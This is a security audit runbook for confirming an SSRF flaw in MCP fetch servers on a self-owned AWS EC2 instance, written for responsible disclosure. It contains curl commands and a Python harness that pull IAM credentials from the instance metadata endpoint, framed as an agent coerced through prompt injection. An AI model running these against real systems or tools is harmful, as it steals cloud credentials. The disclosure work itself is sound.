# Audit runbook: verifying the SSRF findings on real EC2

This runbook turns the "deduced from local behavior" SSRF findings on
[`mcp-server-fetch`](../findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md)
and [`mcp-server-http-request`](../findings/2026-05-11-MCP-D-003-http-request-direct-environment-dependent-ssrf.md)
into "demonstrated on cloud, IMDS credentials retrieved" disclosure-grade evidence.

**Time:** ~30 minutes end-to-end the first time (most of it is AWS account setup if you don't have one). ~5 minutes if you already have an AWS account.

**Cost:** ~$0.01. The `t3.micro` instance is AWS Free Tier eligible. If you stay under 750 hours/month aggregate across all Free Tier instances, you pay nothing. If you forget to terminate the instance and leave it running, you'd pay ~$0.01/hour after Free Tier exhausts. **Step 9 below covers teardown — do not skip it.**

---

## Two paths

| Path | Goal | Cost | Time | Evidence quality |
|---|---|---|---|---|
| **A — Local mock IMDS** | demonstrate the mechanism | $0, no AWS | 10 min | mechanism proof; not disclosure-grade |
| **B — Real EC2** | get the smoking gun | ~$0.01 (Free Tier) | 30 min | disclosure-grade, real credentials |

This document covers **Path B** (the disclosure-grade one). For Path A, see the appendix at the bottom.

---

## Prerequisites

- A computer with SSH (any Mac, Linux, or Windows w/ PowerShell or WSL).
- An email address.
- A credit card (required by AWS even on Free Tier; you won't be charged for this exercise).
- About 30 minutes.

---

## Part 1 — Get an AWS account (10 min, skip if you have one)

1. Go to https://aws.amazon.com/ and click **Create an AWS Account**.
2. Fill in email, password, and an account name (e.g. `dishant-personal`).
3. Choose **Personal** account.
4. Enter address + phone.
5. Add a credit card. AWS will pre-authorize $1 to verify; it won't be charged unless you exceed Free Tier.
6. Verify your phone via SMS or call.
7. Choose the **Basic Support — Free** plan.
8. Sign in to the AWS Management Console.
9. Top-right region selector — pick **us-east-1 (N. Virginia)**. This is the cheapest region and what the rest of this runbook assumes.

---

## Part 2 — Create an IAM role for the instance (3 min)

The point of the SSRF demonstration is that *fetch retrieves IAM credentials from IMDS*. For IMDS to return credentials, the instance must have an IAM role attached. We give it a minimal role with `AmazonEC2ReadOnlyAccess` — enough that exfiltrating its credentials is a real (if low-impact) compromise.

1. AWS Console → search **IAM** → open it.
2. Left sidebar → **Roles** → **Create role**.
3. **Trusted entity type:** AWS service.
4. **Use case:** EC2. Click **Next**.
5. Search and check **AmazonEC2ReadOnlyAccess**. Click **Next**.
6. **Role name:** `mcp-scan-ssrf-test-role`.
7. Click **Create role**.

---

## Part 3 — Create an SSH key pair (2 min)

1. Console → search **EC2** → open it.
2. Left sidebar → **Key Pairs** (under "Network & Security").
3. Click **Create key pair**.
4. Name: `mcp-scan-test`. Type: **RSA**. Format: **.pem** (Linux/macOS) or **.ppk** (Windows PuTTY).
5. Click **Create key pair**. Your browser downloads `mcp-scan-test.pem`.
6. Move it to `~/.ssh/` and set permissions:
   ```bash
   mv ~/Downloads/mcp-scan-test.pem ~/.ssh/
   chmod 400 ~/.ssh/mcp-scan-test.pem
   ```

---

## Part 4 — Launch the EC2 instance (5 min)

1. EC2 Console → **Launch instance**.
2. **Name:** `mcp-scan-ssrf-test`.
3. **Application and OS Images (AMI):** keep the default `Amazon Linux 2023` (Free Tier eligible).
4. **Instance type:** `t3.micro` (Free Tier eligible).
5. **Key pair (login):** select `mcp-scan-test` (from Part 3).
6. **Network settings:** click **Edit**.
   - Leave VPC and Subnet defaults.
   - **Firewall (security groups):** select **Create security group**.
   - Inbound rules: allow **SSH** from **My IP** (the console auto-detects yours). Don't open it to anywhere — that's how mistakes turn into security incidents.
7. **Configure storage:** keep default 8 GB gp3 (Free Tier eligible).
8. **Advanced details:** scroll down to **IAM instance profile** → select `mcp-scan-ssrf-test-role` (from Part 2).
9. Click **Launch instance**.
10. Wait ~30 seconds. Click **View all instances**. Wait for state to become **Running** and status checks to pass (another ~1 minute).
11. Click the instance → copy its **Public IPv4 address**.

---

## Part 5 — SSH into the instance (1 min)

```bash
ssh -i ~/.ssh/mcp-scan-test.pem ec2-user@<PUBLIC_IP>
```

First time: type `yes` to accept the host key.

You'll get a prompt like `[ec2-user@ip-172-31-22-180 ~]$`. You're inside the instance.

---

## Part 6 — Sanity-check that IMDS is reachable (1 min)

Inside the instance, run:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

You should see `mcp-scan-ssrf-test-role` printed. That's IMDS confirming the role we attached.

Now retrieve actual credentials:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/
```

You should see a JSON block with `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration`. **Those are real, valid AWS credentials.** They expire in a few hours but right now they have `AmazonEC2ReadOnlyAccess` on your account.

If this works, the next step (the actual SSRF demonstration) will show that `mcp-server-fetch` retrieves exactly the same content when prompted.

---

## Part 7 — Install mcp-server-fetch and reproduce the SSRF (5 min)

Still inside the EC2 instance:

```bash
# Install Python tools and the vulnerable server
sudo dnf install -y python3-pip
pip3 install --user mcp-server-fetch

# Add user-installed scripts to PATH
export PATH="$HOME/.local/bin:$PATH"
```

Now run a minimal harness that talks to fetch over stdio and asks it to fetch the IMDS credentials endpoint:

```bash
cat > ssrf_demo.py <<'PYEOF'
import asyncio
import json
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

IMDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/"

async def main():
    params = StdioServerParameters(
        command="python3", args=["-m", "mcp_server_fetch"], env=None,
    )
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            print(f"\n--- calling fetch({IMDS_URL!r}) ---\n")
            result = await session.call_tool("fetch", {"url": IMDS_URL})
            for item in result.content:
                text = getattr(item, "text", str(item))
                print(text)

asyncio.run(main())
PYEOF

python3 ssrf_demo.py
```

**Expected output:** the AWS credential JSON, returned by `mcp-server-fetch` exactly as IMDS would have returned it. Something like:

```
--- calling fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/') ---

Contents of http://169.254.169.254/latest/meta-data/iam/security-credentials/mcp-scan-ssrf-test-role/:
{
  "Code" : "Success",
  "LastUpdated" : "2026-...",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "...",
  "Expiration" : "..."
}
```

**That's the smoking gun.** A vulnerable MCP tool returned IAM credentials when an attacker (via prompt injection of the agent using this server) coerced it into fetching a metadata-service URL.

---

## Part 8 — Capture the evidence

- **Screenshot the terminal** showing the IMDS URL request and the `AccessKeyId` / `SecretAccessKey` / `Token` block in the response.
- Optionally, save the raw output: `python3 ssrf_demo.py > ssrf_demo_output.txt`.
- Note the timestamp, the instance ID, the role name, and the AMI you used.

For disclosure, you DO NOT include the actual credential values — they're sensitive and expire shortly anyway. You include enough to prove the leak: the request URL, response shape with field names visible, partially-redacted values.

Then immediately on the EC2 instance, rotate or invalidate any creds that may have been touched: in this exercise they're scoped to a single throwaway role you're about to delete, so just continue to teardown.

---

## Part 9 — Tear down (DO NOT SKIP)

This is the only step that costs money if you skip it.

### Terminate the instance

1. AWS Console → EC2 → Instances.
2. Select `mcp-scan-ssrf-test`.
3. **Instance state** → **Terminate instance**.
4. Wait until state shows **Terminated** (~30 seconds).

### Delete the IAM role

1. Console → IAM → Roles.
2. Search `mcp-scan-ssrf-test-role` → select → **Delete**. Type the role name to confirm.

### Delete the key pair (optional — costs nothing to keep)

1. EC2 Console → Key Pairs → select `mcp-scan-test` → **Delete**.

### Delete the security group (optional)

1. EC2 Console → Security Groups → find the one created in Part 4 (named like `launch-wizard-1`) → **Delete**.

After this, your AWS account is back to zero cost.

---

## Part 10 — Update the finding entries

Now that you have demonstrated evidence, edit both finding entries in [`findings/`](../findings/):

In each file, find the `## What was *not* observed` section and replace it with `## Reproduction on EC2 (2026-05-12)` containing:

- Date
- Instance type + AMI + region
- IAM role attached
- Exact `ssrf_demo.py` output (with credentials redacted)
- Screenshot reference

Then update the **Outcome** at the top from "Vulnerability (deduced)" to "**Vulnerability (demonstrated on EC2)**".

Commit and push.

---

## Part 11 — File the disclosure

You now have everything needed to open issues against the maintainers.

### Anthropic / `mcp-server-fetch`

1. Go to https://github.com/modelcontextprotocol/servers/issues/new
2. Title: "Security: mcp-server-fetch lacks default SSRF protection; cloud-hosted instances expose IMDS credentials"
3. Body: use the **Disclosure draft** at the bottom of [findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md](../findings/2026-05-11-MCP-D-003-fetch-direct-environment-dependent-ssrf.md), plus your EC2 reproduction details, with credentials redacted.
4. Mention you'll publicly disclose in 90 days.

### `mcp-server-http-request`

Same process, against the upstream repo (find it linked from the PyPI page).

Open both on the same day — they're the same class of bug and a single coordinated disclosure looks more professional than two separate filings on different days.

---

## Appendix — Path A: local mock IMDS (no AWS)

If you want to demonstrate the mechanism *right now* without setting up AWS, this works as a proof-of-concept but is not disclosure-grade because the credentials aren't real.

```bash
# Terminal 1: fake IMDS on 127.0.0.1:8080
cat > mock_imds.py <<'PYEOF'
from aiohttp import web

FAKE = {"Code":"Success","AccessKeyId":"ASIAEXAMPLE",
        "SecretAccessKey":"EXAMPLEKEY","Token":"EXAMPLE",
        "Expiration":"2099-12-31T00:00:00Z"}

async def handler(req):
    if req.path.endswith("/iam/security-credentials/"):
        return web.Response(text="mock-role\n")
    if "mock-role" in req.path:
        import json; return web.Response(text=json.dumps(FAKE, indent=2))
    return web.Response(status=404)

app = web.Application()
app.router.add_route("*", "/{path:.*}", handler)
web.run_app(app, host="127.0.0.1", port=8080)
PYEOF
python3 mock_imds.py
```

In Terminal 2:

```bash
# Modify the demo to hit your mock instead of real IMDS:
sed -i.bak 's|http://169.254.169.254|http://127.0.0.1:8080|' ssrf_demo.py
python3 ssrf_demo.py
```

You'll see `mcp-server-fetch` return the fake credential JSON. The proof: fetch made no attempt to validate that `127.0.0.1:8080` was a non-sensitive destination. On real EC2 substitute `127.0.0.1:8080` with `169.254.169.254` and the same blind fetch happens — except now it's real AWS credentials.

This local demonstration is fine for a blog post or talk visual. It is **not** what you file with maintainers as evidence.
